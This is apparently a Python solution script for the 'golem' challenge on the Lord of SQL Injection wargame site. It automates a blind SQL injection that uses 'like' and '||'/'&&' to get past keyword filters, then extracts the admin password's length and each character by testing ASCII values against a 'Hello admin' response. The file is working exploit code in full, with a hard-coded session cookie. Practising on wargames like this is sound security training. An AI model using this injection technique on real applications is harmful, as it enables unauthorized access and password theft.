import requests
import string

header = {"Cookie": "PHPSESSID=f0qtti1vj4ignho60h43jjqe12;"}
url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
string_data = string.digits + string.ascii_letters

print(string_data)

password = ""
password_len = 1

# find password length
while True:
    data = "?pw=' || id like 'admin' %26%26 length(pw) like {}%23".format(str(password_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(password_len))
    password_len += 1
print("[+] Get Password Length : " + str(password_len))

# find password
for idx in range(1, password_len + 1):
    for i in string_data:
        data = "?pw=' || id like 'admin' %26%26 ascii(mid(pw,{},1)) like {}%23".format(idx,ord(i))
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            password = password + i
            print("[*] Finding... : " + password)
            break
print("[+] Found Password : " + password)